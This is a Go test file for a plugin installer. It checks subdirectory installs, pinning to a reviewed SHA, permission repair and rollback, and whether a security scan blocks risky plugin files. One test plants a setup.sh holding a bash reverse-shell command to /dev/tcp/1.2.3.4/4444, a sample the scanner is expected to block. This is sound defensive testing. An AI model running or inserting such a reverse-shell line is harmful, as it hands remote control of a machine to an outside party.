package plugins

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"

	"github.com/nickheyer/icebath/pkg/home"
	"github.com/nickheyer/icebath/pkg/skills"
)

// Git repo whose plugin lives in my-plugin with docs and tests at the root
func makeRepoWithSubdirPlugin(t *testing.T, root string) {
	t.Helper()
	c6Write(t, filepath.Join(root, "README.md"), "# Monorepo docs\n")
	c6Write(t, filepath.Join(root, "tests", "test_x.py"), "def test_x():\n    pass\n")
	c6Write(t, filepath.Join(root, "my-plugin", "plugin.yaml"), "name: my-plugin\nmanifest_version: 1\ndescription: A subdir plugin\n")
	c6Write(t, filepath.Join(root, "my-plugin", "__init__.py"), "# plugin entry\n")
	c6Git(t, root, "init", "-q")
	c6Commit(t, root, "init")
}

// Publication world of the end to end installs, its home and a context bound to it
func e2eHome(t *testing.T) (string, string, context.Context) {
	t.Helper()
	c6RequireGit(t)
	root, h := pubWorld(t)
	return root, h, home.WithOverride(context.Background(), h)
}

func TestInstallsOnlyTheSubdirPlugin(t *testing.T) {
	root, h, ctx := e2eHome(t)
	repo := filepath.Join(root, "monorepo")
	makeRepoWithSubdirPlugin(t, repo)
	target, manifest, name, err := installPluginCore(ctx, "file://"+filepath.ToSlash(repo)+"#my-plugin", installCoreOptions{})
	if err != nil {
		t.Fatal(err)
	}
	want, _ := filepath.EvalSymlinks(filepath.Join(h, "plugins"))
	if name != "my-plugin" || manifest["name"] != "my-plugin" || target != filepath.Join(want, "my-plugin") {
		t.Fatalf("install %s %v %s", name, manifest, target)
	}
	if !pathExists(filepath.Join(target, "plugin.yaml")) || !pathExists(filepath.Join(target, "__init__.py")) ||
		pathExists(filepath.Join(target, "README.md")) || pathExists(filepath.Join(target, "tests")) {
		t.Fatal("installed tree is not the subdirectory alone")
	}
}

func TestMissingSubdirRaises(t *testing.T) {
	root, _, ctx := e2eHome(t)
	repo := filepath.Join(root, "monorepo")
	makeRepoWithSubdirPlugin(t, repo)
	_, _, _, err := installPluginCore(ctx, "file://"+filepath.ToSlash(repo)+"#does-not-exist", installCoreOptions{})
	var opErr *PluginOperationError
	if !errors.As(err, &opErr) || !strings.Contains(err.Error(), "does not exist") {
		t.Fatalf("missing subdir %v", err)
	}
}

func TestInstallsPortableRootPackageDisabled(t *testing.T) {
	root, h, ctx := e2eHome(t)
	repo := filepath.Join(root, "portable-repo")
	manifest, _ := json.Marshal(map[string]any{"$schema": PluginSchemaV1, "name": "portable.test"})
	c6Write(t, filepath.Join(repo, "plugin.json"), string(manifest))
	c6Git(t, repo, "init", "-q")
	c6Commit(t, repo, "init")
	target, got, name, err := installPluginCore(ctx, "file://"+filepath.ToSlash(repo), installCoreOptions{})
	if err != nil {
		t.Fatal(err)
	}
	want, _ := filepath.EvalSymlinks(filepath.Join(h, "plugins"))
	if name != "portable.test" || got["name"] != "portable.test" || target != filepath.Join(want, "portable.test") {
		t.Fatalf("install %s %v %s", name, got, target)
	}
	if key, _, err := resolvePluginKeyAndSource(ctx, "portable.test"); err != nil || key != "portable.test" {
		t.Fatalf("key %q %v", key, err)
	}
}

// Clone double that writes a scanme manifest plus one extra file and reports the requested revision
func fakeScanClone(t *testing.T, extraFile, body string) {
	t.Helper()
	previous, previousScan := clonePluginRepo, scanOnInstallEnabled
	t.Cleanup(func() { clonePluginRepo, scanOnInstallEnabled = previous, previousScan })
	clonePluginRepo = func(_ context.Context, _, tmpClone, _, revision, _ string) (string, error) {
		if err := os.Mkdir(tmpClone, 0o755); err != nil {
			return "", err
		}
		c6Write(t, filepath.Join(tmpClone, "plugin.yaml"), "name: scanme\nmanifest_version: 1\n")
		c6Write(t, filepath.Join(tmpClone, extraFile), body)
		if revision != "" {
			return revision, nil
		}
		return strings.Repeat("b", 40), nil
	}
	scanOnInstallEnabled = func(string) bool { return true }
}

func TestCautionTrustedOnlyAtTheReviewedSha(t *testing.T) {
	_, _, ctx := e2eHome(t)
	sha := strings.Repeat("a", 40)
	fakeScanClone(t, "helper.py", "eval('1 + 1')\n")
	var blocked *PluginScanBlocked
	if _, _, _, err := installPluginCore(ctx, "https://github.com/o/r", installCoreOptions{}); !errors.As(err, &blocked) {
		t.Fatalf("raw source %v", err)
	}
	if _, _, _, err := installPluginCore(ctx, "https://github.com/o/r", installCoreOptions{Ref: strings.Repeat("c", 40), ReviewedPin: sha}); !errors.As(err, &blocked) {
		t.Fatalf("checkout off the pin %v", err)
	}
	target, _, name, err := installPluginCore(ctx, "https://github.com/o/r", installCoreOptions{Ref: sha, ReviewedPin: sha})
	if err != nil || name != "scanme" || !isDir(target) {
		t.Fatalf("reviewed pin %s %s %v", name, target, err)
	}
}

func TestDangerousBlocksEvenAtTheReviewedSha(t *testing.T) {
	_, _, ctx := e2eHome(t)
	sha := strings.Repeat("a", 40)
	fakeScanClone(t, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
	var blocked *PluginScanBlocked
	if _, _, _, err := installPluginCore(ctx, "https://github.com/o/r", installCoreOptions{Ref: sha, ReviewedPin: sha}); !errors.As(err, &blocked) {
		t.Fatalf("dangerous at the pin %v", err)
	}
}

// Clone double whose manifest lands with mode 000 and a scan that passes every tree
func cloneWithUnreadableManifest(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("root ignores mode bits")
	}
	previous, previousScan := clonePluginRepo, scanPluginTree
	t.Cleanup(func() { clonePluginRepo, scanPluginTree = previous, previousScan })
	clonePluginRepo = func(_ context.Context, _, tmpClone, _, _, _ string) (string, error) {
		if err := os.Mkdir(tmpClone, 0o755); err != nil {
			return "", err
		}
		manifest := filepath.Join(tmpClone, "plugin.yaml")
		c6Write(t, manifest, "name: badperm\nmanifest_version: 1\n")
		return strings.Repeat("0", 40), os.Chmod(manifest, 0)
	}
	scanPluginTree = func(string, string, string, scanOptions) (*skills.ScanResult, error) { return nil, nil }
}

func TestUnreadableFileIsRepairedBeforeInstall(t *testing.T) {
	_, _, ctx := e2eHome(t)
	cloneWithUnreadableManifest(t)
	target, _, name, err := installPluginCore(ctx, "file:///tmp/x", installCoreOptions{})
	if err != nil || name != "badperm" || !strings.HasPrefix(gitPullRead(t, filepath.Join(target, "plugin.yaml")), "name: badperm") {
		t.Fatalf("repaired install %s %v", name, err)
	}
}

func TestUnrepairableTreeRollsBackAndNamesTheFix(t *testing.T) {
	_, h, ctx := e2eHome(t)
	cloneWithUnreadableManifest(t)
	previous := osChmod
	t.Cleanup(func() { osChmod = previous })
	osChmod = func(string, os.FileMode) error { return &os.PathError{Op: "chmod", Err: os.ErrPermission} }
	if err := os.MkdirAll(filepath.Join(h, "plugins"), 0o755); err != nil {
		t.Fatal(err)
	}
	_, _, _, err := installPluginCore(ctx, "file:///tmp/x", installCoreOptions{})
	var opErr *PluginOperationError
	if !errors.As(err, &opErr) || !regexp.MustCompile(`plugin.yaml is not readable.*chmod -R u\+rX`).MatchString(err.Error()) {
		t.Fatalf("unrepairable tree %v", err)
	}
	if left, _ := os.ReadDir(filepath.Join(h, "plugins")); len(left) != 0 {
		t.Fatalf("plugins dir holds %v", left)
	}
}
